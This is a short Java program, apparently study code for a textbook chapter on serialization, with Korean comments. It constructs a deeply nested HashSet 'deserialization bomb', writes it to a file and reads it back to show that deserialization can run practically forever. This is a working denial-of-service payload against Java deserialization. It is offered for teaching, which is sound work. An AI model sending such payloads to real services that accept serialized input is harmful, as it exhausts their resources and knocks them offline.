package ch12.item85;

import java.io.*;
import java.util.HashSet;
import java.util.Set;

public class SerializeAttacker {
    public static String FILE_NAME = "custom.03";
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        serialize(bomb());
        deserialize();
    }

    //절대로 끝나지 않는 역직렬화 폭탄!
    public static Set<Object> bomb(){
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("foo");
            s1.add(t1); s1.add(t2);
            s2.add(t1); s2.add(t2);
            s1 = t1; //set 안에 set을 계속 해서 넣는다.
            s2 = t2;
        }
        return root;
    }

    public static void serialize(Set<Object> set) throws IOException {

        try(FileOutputStream fos = new FileOutputStream(FILE_NAME);
            BufferedOutputStream bos = new BufferedOutputStream(fos);
            ObjectOutputStream out = new ObjectOutputStream(bos)){

            out.writeObject(set);

        }
    }

    public static Set<Object> deserialize() throws IOException, ClassNotFoundException {

        try (FileInputStream fis = new FileInputStream(FILE_NAME);
             BufferedInputStream bis = new BufferedInputStream(fis);
             ObjectInputStream in = new ObjectInputStream(bis)) {

            Set<Object> set = (Set<Object>) in.readObject();
            return set;
        }
    }
}
